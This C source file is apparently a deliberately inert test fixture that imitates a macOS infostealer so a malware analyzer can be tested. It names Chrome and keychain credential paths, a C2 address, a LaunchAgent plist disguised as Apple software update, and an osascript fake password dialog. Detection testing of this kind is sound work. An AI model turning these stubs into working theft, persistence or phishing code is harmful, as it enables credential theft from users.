/* HARMLESS fixture: looks like an infostealer to the analyzer (it references
   credential paths, a C2 URL, a persistence plist and a fake password prompt)
   but does nothing — main() just returns. Used to test detection. */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

static const char *CHROME = "Library/Application Support/Google/Chrome/Default/Login Data";
static const char *KEYCHAIN = "Library/Keychains/login.keychain-db";
static const char *C2 = "http://185.199.111.1/collect";
static const char *PLIST = "Library/LaunchAgents/com.apple.softwareupdate.plist";
static const char *PROMPT = "display dialog \"macOS needs your password to continue\" default answer \"\" with hidden answer";

__attribute__((noinline)) void exfiltrate(const char *data) {
    FILE *f = fopen(C2, "r");          /* pretend network sink */
    if (f) { fread((void*)data, 1, 1, f); fclose(f); }
}

__attribute__((noinline)) void steal_credentials(void) {
    FILE *a = fopen(CHROME, "rb");
    FILE *b = fopen(KEYCHAIN, "rb");
    char buf[64];
    snprintf(buf, sizeof buf, "%p%p", (void*)a, (void*)b);
    exfiltrate(buf);
}

__attribute__((noinline)) void fake_prompt(void) {
    char cmd[256];
    snprintf(cmd, sizeof cmd, "osascript -e '%s'", PROMPT);
    system(cmd);
}

__attribute__((noinline)) void persist(void) {
    FILE *f = fopen(PLIST, "w");
    if (f) { fputs("<plist/>", f); fclose(f); }
}

int main(int argc, char **argv) {
    if (argc > 99) { steal_credentials(); fake_prompt(); persist(); }
    return 0;
}
